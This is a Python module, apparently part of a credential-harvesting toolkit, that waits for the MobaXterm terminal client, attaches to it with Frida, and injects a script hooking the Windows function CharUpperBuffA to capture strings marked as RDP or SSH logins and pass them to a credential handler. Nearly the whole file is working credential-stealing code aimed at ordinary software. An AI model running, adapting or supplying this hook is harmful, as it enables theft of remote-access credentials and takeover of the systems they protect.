from PyHook import wait_for_process, on_credential_submit, log
import frida

hook_process_name = "mobaxterm"


def logger(message):
    log(hook_process_name, message)


def wait_for():
    wait_for_process(["MobaXterm.exe"], hook)


def hook(pid):
    try:
        logger("Trying To Hook Into MobaXterm")
        session = frida.attach(pid)
        logger(f"Hooked MobaXterm With PID {pid}")
        script = session.create_script("""

		var creds;
		var CharUpperBuffA = Module.findExportByName("User32.dll", "CharUpperBuffA")
		Interceptor.attach(CharUpperBuffA, {
			onEnter: function (args) 
			{
				creds = args[0];
				var data = creds.readAnsiString()

				if (data)
				{
					if(data.includes("rdp:"))
					{
						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermRDP" +"\\n"+ "Keyword    : " + data + "\\n=============================");
					}
					if(data.includes(", 22 ,"))
					{
						send("\\n=============================" + "\\n[+] Intercepted Creds from MobaXtermSSH" +"\\n"+ "Keyword    : " + data + "\\n=============================");
					}

				}	
			}
		});

		""")
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        logger("Unhandled exception: " + str(e))
        logger("Continuing...")
